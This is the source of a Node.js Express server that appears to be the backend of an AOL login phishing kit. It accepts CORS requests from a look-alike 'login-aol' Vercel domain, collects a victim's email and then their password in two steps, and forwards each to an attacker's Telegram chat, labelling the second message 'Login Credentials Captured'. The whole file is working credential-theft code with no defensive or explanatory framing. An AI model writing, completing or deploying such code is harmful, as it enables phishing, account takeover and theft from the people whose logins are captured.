require("dotenv").config();
const express = require("express");
const cors = require('cors');
const axios = require("axios");
const { v4: uuidv4 } = require("uuid");

const app = express();

// Simple CORS - Only your Vercel domain + localhost (no crashing wildcard)
app.use(cors({
  origin: [
    'https://login-aol.vercel.app',
    'http://localhost:3000',
    'http://127.0.0.1:3000'
  ],
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type'],
  credentials: true
}));

app.use(express.json());

// ====================== TELEGRAM SETUP ======================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error("Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in .env");
  process.exit(1);
}

async function sendToTelegram(text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text,
      parse_mode: "Markdown",
    });
    console.log("✅ Sent to Telegram");
  } catch (err) {
    console.error("Telegram error:", err.message);
  }
}

// Store attempts
const loginAttempts = new Map();

// Submit Email
app.post("/api/submit-email", async (req, res) => {
  const { email } = req.body;

  if (!email) {
    return res.status(400).json({ error: "Email is required" });
  }

  const attemptId = uuidv4();
  const userAgent = req.get("User-Agent") || "Unknown";

  loginAttempts.set(attemptId, {
    email,
    userAgent,
    timestamp: new Date().toISOString(),
  });

  await sendToTelegram(
    `🏋️‍♂️ *New Login Attempt*\n\n` +
    `📧 *Email:* ${email}\n` +
    `📱 *Device:* ${userAgent.slice(0, 120)}\n` +
    `⏳ Waiting for password...`
  );

  res.json({ status: "success", attemptId });
});

// Submit Password
app.post("/api/submit-password", async (req, res) => {
  const { attemptId, password } = req.body;

  if (!attemptId || !password) {
    return res.status(400).json({ error: "Missing data" });
  }

  const attempt = loginAttempts.get(attemptId);
  if (!attempt) {
    return res.status(404).json({ error: "Invalid attempt ID" });
  }

  attempt.password = password;

  await sendToTelegram(
    `✅ *Login Credentials Captured*\n\n` +
    `📧 *Email:* ${attempt.email}\n` +
    `🔑 *Password:* \`${password}\``
  );

  res.json({ status: "success" });
});

const port = process.env.PORT || 8080;

app.listen(port, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${port}`);
  console.log("✅ CORS enabled for login-aol.vercel.app + localhost");
});
